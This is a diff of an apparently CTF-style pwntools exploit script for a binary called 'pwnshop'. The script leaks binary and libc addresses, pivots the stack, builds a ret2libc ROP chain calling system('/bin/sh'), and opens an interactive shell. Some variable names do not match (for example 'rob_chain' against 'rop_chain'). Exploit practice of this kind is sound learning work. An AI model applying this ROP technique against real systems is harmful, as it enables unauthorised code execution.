@@ -5,17 +5,9 @@ context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/pwnshop'
 
-buy_padding = 72
-
-#elf = context.binary = ELF(executable)
-
-log.info('Get Addresses')
-
-#info("%s symbols", elf.symbols)
-#info("%s plt", elf.plt)
-#info("%s got", elf.got)
-#info("%s libs", elf.libs)
-
+buy_padding_offset = 72
+leak_padding_offset = 8
+rop_padding_offset = 40
 
 log.info('Create IO')
 #io = remote('', )
@@ -34,23 +26,6 @@ binary_offset = u64(binary_offset, endian='little')
 binary_offset -= 0x40c0
 log.success(f'Leaked binary offset: {str(hex(binary_offset))}')
 
-
-"""
-log.info('Stack Pivot')
-
-padding_to_rop = b'a' * rop_padding_offset
-sell_function = p64(0x126a + binary_offset)
-
-rop_chain = sell_function + sell_function
-padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
-sub_rsp = p64(0x1219 + binary_offset)
-
-payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
-print(payload)
-
-io.sendlineafter('\n> ', '1')
-io.sendafter('Enter details: ', payload)
-"""
 
 log.info('leaking LIBC address with stack pivot')
 
@@ -88,25 +63,11 @@ log.info(f'Calculated System Location: {str(hex(u64(system)))}')
 sh = p64(libc_offset + libc_sh)
 log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')
 
+rob_chain = pop_rdi + sh + system
+padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
+payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
 
-
-log.info('Send Command')
-io.sendlineafter('>', '1')
-
-payload = cyclic(200)
-
-log.info('Send Payload')
-io.sendlineafter('details: ', payload)
-
-io.wait()
-
-core = io.corefile
-stack = core.rsp
-info("rsp = %#x", stack)
-pattern = core.read(stack, 4)
-info("cyclic pattern = %s", pattern.decode())
-rip_offset = cyclic_find(pattern)
-info("rip offset is = %d", rip_offset)
+io.sendafter('Enter details: ', payload)
 
 io.interactive()
 
